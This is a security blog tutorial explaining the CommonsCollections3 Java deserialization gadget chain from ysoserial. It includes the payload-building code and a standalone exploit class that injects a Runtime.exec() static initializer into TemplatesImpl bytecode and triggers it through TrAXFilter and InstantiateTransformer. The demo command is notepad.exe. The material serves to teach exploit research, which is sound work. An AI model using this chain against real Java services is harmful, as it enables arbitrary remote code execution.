<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>CommonsCollection3 | zdaylabs</title>
<link rel="stylesheet" href="style.css"/>
<style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
      color: #dcdcdc;
      line-height: 1.6;
      padding: 0 2rem;
      min-height: 100vh;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 2rem 0 1rem;
      border-bottom: 1px solid #333;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: #ffffff;
    }
    
    nav a {
      margin: 0 1rem;
      text-decoration: none;
      color: #ccc;
      font-size: 0.95rem;
    }
    
    nav a:hover {
      color: #fef200;
    }
    
    .socials a {
      margin-left: 1rem;
      color: #999;
      font-size: 1.2rem;
      text-decoration: none;
    }
    
    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    
    h1 {
      font-size: 2.5rem;
      color: #fff;
      margin-bottom: 1rem;
    }
    
    h2 {
      color: #fef200;
      font-size: 1.8rem;
      margin: 2rem 0 1rem;
      border-bottom: 2px solid #333;
      padding-bottom: 0.5rem;
    }
    
    h3 {
      color: #fef200;
      font-size: 1.4rem;
      margin: 1.5rem 0 0.8rem;
    }
    
    h4 {
      color: #fef200;
    }
    
    .highlight {
      color: #fef200;
      font-weight: 600;
    }
    
    .accent {
      color: #36d1dc;
    }
    
    p {
      color: #bbb;
      margin-bottom: 1rem;
    }
    
    
    
    a {
      color: #36d1dc;
      text-decoration: none;
    }
    
    a:hover {
      color: #fef200;
    }
    
    ul, ol {
      color: #bbb;
    }
    
    li {
      margin-bottom: 0.5rem;
    }
    
    img {
      max-width: 100%;
      height: auto;
      border-radius: 4px;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
<div id="navigation-placeholder"></div>
<script src="navigation.js"></script>
<main>
<h1>CommonsCollection3</h1>

The commonsCollection3 and CommonsCollection1 is exactly the same except instead of InvokerTransFormer we use instantiateTransformer and uses of TemplatesImpl and TraXFilter.class

<b>Prerequisites: Java Assist</b>
<p>
    If you do not understand how javaAssist Works please go through https://www.javassist.org/tutorial/tutorial.html before reading further, as it's crucial to understand the payload.
</p>

So lets Understand how this instantiateTransformer works.
Why we need TemplateImpl class and TraxFilter class.

Checkout the bonus article to learn a little bit more into these and how can we modify the existing ysoserial code and use slightly different code to achieve Code Execution.

<h3>instantiateTransformer</h3>
The instantiateTransformer takes a class and instantiates it with the value(data) provided to it.

InstantiateTransformer() constructor takes 2 parameters.
- Parameter Type(a class array of types)
- args(The Object type).

<p>
    When we call the transform() on the instantiateTransformer, the transform() takes one argument.
    Lets say this is input.<br/>
    Now lets see how the transForm() looks like in InstantiateTransFormer.
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">@Override</span>
    <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Class</span> input) {
        <span style="color: #cf8e6d;">try</span> {
            <span style="color: #cf8e6d;">if</span> (input == null) {
                <span style="color: #cf8e6d;">throw new</span> FunctorException(
                    <span style="color: #6aab73;">"InstantiateTransformer: Input object was not an instanceof Class, it was a null object"</span>);
            }
            <span style="color: #cf8e6d;">final</span> Constructor con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
            <span style="color: #cf8e6d;">return</span> (T) con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> NoSuchMethodException ex) {
            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: The constructor must exist and be public"</span>);
        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> InstantiationException ex) {
            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: InstantiationException"</span>, ex);
        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> IllegalAccessException ex) {
            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: Constructor must be public"</span>, ex);
        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">final</span> InvocationTargetException ex) {
            <span style="color: #cf8e6d;">throw new</span> FunctorException(<span style="color: #6aab73;">"InstantiateTransformer: Constructor threw an exception"</span>, ex);
        }
    }
    </pre>
    </div>
    
</p>
<p>Which can be simplified as below</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Class</span> input) {
        <span style="color: #cf8e6d;">final</span> Constructor con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
        <span style="color: #cf8e6d;">return</span> con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
    }
    </pre>
    </div>
    
</p>
<p>So the argument we pass to the transform() is the input, and as you can see the transForm uses Reflections to find all the <b>Public</b> Constructors that takes an Argument<br/>
of iParamTypes i.e the type we pass during the initilisation and then it creates a new object of it using newInstance()</p>
<p>
    So lets take some example
</p>
<p>Lets say we have a class called AnotherClass which looks like below<br/>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">import</span> java.lang.reflect.Method;
    <span style="color: #cf8e6d;">public class</span> AnotherClasss {
        <span style="color: #cf8e6d;">public</span> AnotherClasss(testclass b, <span style="color: #cf8e6d;">String</span> input) {
            b.<span style="color: #56a8f5;">Hello</span>(input);
        }
    }
    </pre>
    </div>
    
<br/>
Lets Say there is another class called testclass which looks like below
<br/>
<div style="background-color: #1e1f22; color: #bcbec4;">
  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
  <span style="color: #cf8e6d;">public class</span> testclass {
  
      <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">Hello</span>(<span style="color: #cf8e6d;">String</span> a) {
          System.out.<span style="color: #56a8f5;">println</span>(a);
      }
  }
  </pre>
  </div>
  
<br/>

Now we want to call the testClass Hello(), but want to use instntiateTransformer.<br/>we can do that Through AnotherClass and the code will look like below<br/>
<div style="background-color: #1e1f22; color: #bcbec4;">
  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
  
  <span style="color: #cf8e6d;">public class</span> instantclass {
      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
          testclass t = <span style="color: #cf8e6d;">new</span> testclass();
          <span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new Class</span>[] { testclass.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span> };
          <span style="color: #cf8e6d;">Object</span>[] args = <span style="color: #cf8e6d;">new Object</span>[] { t, <span style="color: #6aab73;">"ITWORKS"</span> };
          InstantiateTransformer instantiate = <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
                  paramTypes, args);
          
          instantiate.<span style="color: #56a8f5;">transform</span>(AnotherClasss.<span style="color: #cf8e6d;">class</span>);
      }
  }
  </pre>
  </div>
  </p>
<p>
    SO how exactly this works.?
</p>
<p>
    As we saw above the transform() takes AnotherClass.class and looks for all the Public Constructors.
    It Find the AnotherClass(testclass b,String input)
    And then It initiatlised it.

    Upon initiatlisation as we know the code inside the constrcutors gets executed which indeed calls the b.Hello(input) i.e testClass.Hello("ITWORKS").
    And Hello(String a) method simply prints the Input and hence we see the output as ITWORKS
</p>
<p>
<img src="images/cc/cc3itworks.PNG"/>
</p>
<p>Lets Understand the payload now</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">public Object</span> <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
        Object templatesImpl = Gadgets.<span style="color: #56a8f5;">createTemplatesImpl</span>(command);
    
        <span style="color: #6aab73;">// inert chain for setup</span>
        <span style="color: #cf8e6d;">final Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
            <span style="color: #cf8e6d;">new Transformer</span>[] { <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>) });
    
        <span style="color: #6aab73;">// real chain for after setup</span>
        <span style="color: #cf8e6d;">final Transformer</span>[] transformers = <span style="color: #cf8e6d;">new Transformer</span>[] {
            <span style="color: #cf8e6d;">new</span> ConstantTransformer(TrAXFilter.<span style="color: #cf8e6d;">class</span>),
            <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
                <span style="color: #cf8e6d;">new Class</span>[] { Templates.<span style="color: #cf8e6d;">class</span> },
                <span style="color: #cf8e6d;">new Object</span>[] { templatesImpl })
        };
    
        <span style="color: #cf8e6d;">final Map</span> innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
        <span style="color: #cf8e6d;">final Map</span> lazyMap = LazyMap.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
        <span style="color: #cf8e6d;">final Map</span> mapProxy = Gadgets.<span style="color: #56a8f5;">createMemoitizedProxy</span>(lazyMap, Map.<span style="color: #cf8e6d;">class</span>);
        <span style="color: #cf8e6d;">final InvocationHandler</span> handler = Gadgets.<span style="color: #56a8f5;">createMemoizedInvocationHandler</span>(mapProxy);
    
        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers); <span style="color: #6aab73;">// arm with actual transformer chain</span>
    
        <span style="color: #cf8e6d;">return</span> handler;
    }
    </pre>
    </div>
    
</p>
<div>
<p>
        On the above code we are Using the InstantiateTransFormer with Templates.class and passing the TemplatesImpl 
        We are obtaining the templatesImpl from Gadgets.createTemplatesImpl(Command)

        Instead of reviewing the Gadgets.class of ysoserial lets Review the code below, which basically the same but instead of Gadgets.class we are creating owr own class.
    </p>
</div>
<div>
<p><div style="background-color: #1e1f22; color: #bcbec4;">
  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  <span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.codec.binary.Base64;
  <span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
  <span style="color: #cf8e6d;">import</span> javassist.ClassPool;
  <span style="color: #cf8e6d;">import</span> javassist.CtClass;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Transformer;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
  
  <span style="color: #cf8e6d;">public class</span> TemplatesImplExploit {
      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws Exception</span> {
          <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"notepad.exe"</span>;
          ClassPool pool = ClassPool.<span style="color: #56a8f5;">getDefault</span>();
  
          <span style="color: #6aab73;">/* ... omitted comments ... */</span>
  
          <span style="color: #cf8e6d;">final</span> CtClass clazz = pool.<span style="color: #56a8f5;">get</span>(TemplatesImplExploit.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
          <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
              command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\\"</span>, <span style="color: #6aab73;">"\\\\"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\""</span>, <span style="color: #6aab73;">"\\\""</span>) +
              <span style="color: #6aab73;">"\");"</span>;
          clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
          CtClass superC = pool.<span style="color: #56a8f5;">get</span>(AbstractTranslet.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
          clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
          <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
  
          <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
  
          TemplatesImpl templates = <span style="color: #cf8e6d;">new</span> TemplatesImpl();
          Field bytecodesField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
          bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{maliciousBytecode});
  
          Field nameField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
          nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
  
          Field tfacname = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
          tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          tfacname.<span style="color: #56a8f5;">set</span>(templates, TransformerFactoryImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
  
          <span style="color: #6aab73;">// templates.newTransformer();</span>
  
          ConstantTransformer tr = <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>);
          ConstantTransformer tr1 = <span style="color: #cf8e6d;">new</span> ConstantTransformer(TrAXFilter.<span style="color: #cf8e6d;">class</span>);
          InstantiateTransformer tr2 = <span style="color: #cf8e6d;">new</span> InstantiateTransformer(
              <span style="color: #cf8e6d;">new Class</span>[] { Templates.<span style="color: #cf8e6d;">class</span> },
              <span style="color: #cf8e6d;">new Object</span>[] { templates });
  
          tr2.<span style="color: #56a8f5;">transform</span>(tr1.<span style="color: #56a8f5;">transform</span>(tr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"test"</span>)));
      }
  }
  </pre>
  </div>
  
</p>
</div>
<div>
<p>
        On the above code there 3 section.
        At [1] we are using the JavaAssist to initialised the command and inserting it during the runtime .
        <p>So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName()); and clazz.setSuperclass(superC);<br/>
   
               Reason for calling the above 2 are.
               1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
               AbstractTranslet.class or else TemplatesIMPL will not execute it.</p>

        At [2] we are setting the _bytecode and the _tfactory and the name ,
        <p>


            Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
            * _tfactory , as these are necessary fields.



        </p>
        The _bytecode is simply the bytecode of our class code that gets created during the runtime via javaAssist.
        At [3] we are setting of the InstantiateTransFormer to execute the templates which is basically the TemplatesImpl class Object.
        Now there are couple Questions that need to be answered here.
        <ol>
<li>Why TemplatesImpl Class</li>
<p>The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.</p>
<li>Why TraXFilter Class</li>
<p>If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.<br/>
                 So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer) that takes a entry of type Templates.class and calls the newTransformer() method</p>
<i>But why?</i>
<p>If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.<br/>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
                        <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">final Class</span> input) {
                                   <span style="color: #cf8e6d;">final Constructor</span> con = input.<span style="color: #56a8f5;">getConstructor</span>(iParamTypes);
                                   <span style="color: #cf8e6d;">return</span> con.<span style="color: #56a8f5;">newInstance</span>(iArgs);
                        }
    </pre>
    </div>
    
                   So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return all the public constrcutors present in there , however it's also passing an argument
                   <br/>in getConstructor of  iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class<br/><br/>
                   
                   So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
                   look?<br/>
                   It will look into the TrAXFilter.class for us cause that is what we are passing in.<br/>
                   If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.<br/>
                   (Checkout how InstantiateTransformer Works on the post sections )<br/><br/>
                   
                   
                   Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way just like in the CommonsCollection1.</p>
<li>Why are we passing 1 into constant TransFormer</li>
<p>We dont need, we can remove it and the exploit will still work.</p>
</ol>
</p>
</div>
<div>
<img src="images/cc/cc3calc.PNG"/>
</div>
<div>
<p>
        This is how the CommonsCollection3 Works.
    </p>
<p>We simply use the TemplateImpl class so that we can execute our own _byteCode and then then the instntiateTransformer so that we can instntiate the Templates.Class</p>
<p>Apart from the above changes everything else remains Same</p>
</div>
<h4>Summary:</h4>
<ul>
<li><code>CommonsCollections3</code> is similar to CC1, but uses <code>InstantiateTransformer</code> instead of <code>InvokerTransformer</code>.</li>
<li><code>InstantiateTransformer</code> takes a class and instantiates it using specified constructor arguments.</li>
<li>We use <code>TemplatesImpl</code> to embed malicious bytecode, which is executed when <code>newTransformer()</code> is called.</li>
<li><code>TrAXFilter.class</code> is chosen because it has a public constructor that takes a <code>Templates</code> object and internally calls <code>newTransformer()</code>.</li>
<li>The transformer chain consists of:
    <ul>
<li><code>ConstantTransformer(TrAXFilter.class)</code> - always returns the class</li>
<li><code>InstantiateTransformer</code> - uses the class and the malicious <code>TemplatesImpl</code> object to instantiate a new <code>TrAXFilter</code>, triggering the exploit</li>
</ul>
</li>
<li><code>TemplatesImpl</code> is created using JavaAssist to inject a malicious static initializer (e.g., <code>Runtime.getRuntime().exec()</code>).</li>
<li>Execution occurs when the transform chain is triggered (e.g., via <code>LazyMap.get()</code> or any gadget that invokes the transformer).</li>
</ul>
<p>Thats it for Today.</p>
<p>Thanks For Reading.</p>
<p>Happy Hacking.</p>
<p>You can connect with me at:</p>
<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
</main>
</body>
</html>